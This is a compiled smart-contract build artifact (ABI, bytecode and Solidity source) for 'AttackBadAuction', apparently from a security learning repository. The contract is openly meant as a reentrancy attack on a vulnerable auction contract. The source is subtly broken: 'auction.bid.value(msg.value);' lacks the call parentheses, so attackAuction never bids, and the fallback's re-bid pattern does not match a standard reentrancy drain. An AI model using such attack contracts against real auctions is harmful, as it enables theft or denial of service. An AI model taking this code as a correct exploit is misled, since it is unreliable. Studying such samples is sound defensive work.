{
  "contractName": "AttackBadAuction",
  "abi": [
    {
      "inputs": [
        {
          "name": "_badAuctionAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Balance",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Balance2",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "getBalance",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attackAuction",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405160208061024b8339810160405251600160a060020a038116151561009957604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f696e76616c69642061756374696f6e20636f6e74726163742061646472657373604482015290519081900360640190fd5b60008054600160a060020a03909216600160a060020a0319909216919091179055610182806100c96000396000f30060806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166312065fe08114610105578063c0a62e441461011c575b604080516001815290517f7c9ca5e15ab6228910d4cfb7630c028e7761c571330510d3bfd2177e5129ff619181900360200190a160008054604080517f1998aeef000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff90921692631998aeef923492600480820193929182900301818588803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b5050505050005b34801561011157600080fd5b5061011a610120565b005b61011a5b604080513031815290517fe8d947d7ebdd7b8b8fa2ad2022c7591418ac32d8c29c5f8a8fc9de52ffa540929181900360200190a15600a165627a7a723058205ce7c533d792ded8f9aa08a80c3f0cff5c33e4b44fff61f2e2458bbb112ba8be0029",
  "source": "pragma solidity ^0.4.25;\n\nimport './BadAuction.sol';\n\n/**\n@title Auction reentrancy attack\n@author Ahmed Ali <ahmedaabdulwahed@gmail.com>\nThis contract meant to be a reentrancy attack for\nthe auction contract\n**/\n\ncontract AttackBadAuction {\n    BadAuction private auction;\n\n    event Balance(uint256 value);\n    event Balance2(uint256 value);\n\n    constructor(address _badAuctionAddress) public {\n        // create new instance of the contract\n        require(_badAuctionAddress != address(0), 'invalid auction contract address');\n        auction = BadAuction(_badAuctionAddress);\n    }\n\n    function getBalance() public {\n        emit Balance(address(this).balance);\n    }\n\n    function () public payable{\n        emit Balance2(1);\n        auction.bid.value(msg.value)();\n    }\n\n    function attackAuction() public payable{\n        auction.bid.value(msg.value);\n        emit Balance(address(this).balance);\n    }\n}",
  "sourcePath": "/Users/ahmed/Documents/github_projects/AwesomeSCSecurity/dasp/1-reentrancy/contracts/AttackBadAuction.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-11-12T09:14:17.904Z"
}